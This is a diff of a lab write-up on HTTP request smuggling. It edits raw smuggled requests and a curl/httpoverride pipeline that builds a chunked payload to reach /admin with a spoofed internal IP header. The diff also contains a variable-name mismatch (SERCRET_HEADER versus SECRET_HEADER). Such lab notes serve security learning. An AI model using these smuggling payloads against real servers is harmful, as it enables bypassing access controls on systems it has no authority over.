@@ -95,21 +95,21 @@ curl -X POST http://localhost:8888/ --data "search=toto" -H "Host: $LAB_URL" -H 
 To smuggle the request "embed" it in a normal request. The request will include a large Content-Length. As the back-end use it, it will also include the first characters of the next request (which is provided by front end) **=> Added front-end headers can thus be accessible in the response 💥**:
 
 ***The request:***
-```
+```shell
 POST / HTTP/1.1
 Host: [LAb_URL]
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 124
 Transfer-Encoding: chunked
 
-0         <---- End of 1st request for back-end
+0         #<---- End of 1st request for back-end
 
-POST / HTTP/1.1   <---- Begin of 2nd request for back-end
+POST / HTTP/1.1   #<---- Begin of 2nd request for back-end
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 200 <---- Make back-end waiting for 200 bytes to treat it has a full request
+Content-Length: 200 #<---- Make back-end waiting for 200 bytes to treat it has a full request
 Connection: close
 
-search=test <---- End of 1st request for front-end, backend waiting for the other bytes
+search=test #<---- End of 1st request for front-end, backend waiting for the other bytes
 ```
 
 To construct this request:
@@ -158,7 +158,7 @@ Transfer-Encoding: chunked
 
 0           # <---- End of 1st request for back-end
 
-GET /admin HTTP/1.1        <---- Second request for back-end
+GET /admin HTTP/1.1       # <---- Second request for back-end
 X-*-Ip: 127.0.0.1     # <---- Secret Header
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
@@ -168,11 +168,12 @@ x=1
 ```
 
 ```shell
+export SERCRET_HEADER=[secret_header]
 #Launch server
 httpecho -s
 # Construct a POST request to /admin
-curl -s http://localhost:8888/admin --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > post_admin
-cat post_admin | httpoverride -H "Host:" -H "X-RvdHFj-Ip: 127.0.0.1" > post_admin_modify
+curl -s http://localhost:8888/admin -X GET --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > admin
+cat admin | httpoverride -H "Host:" -H "$SECRET_HEADER: 127.0.0.1" > post_admin_modify
 # Adjust body to smuggle post_admin_modify request
 printf "0\r\n\r\n$(cat post_admin_modify)" > payload
 curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
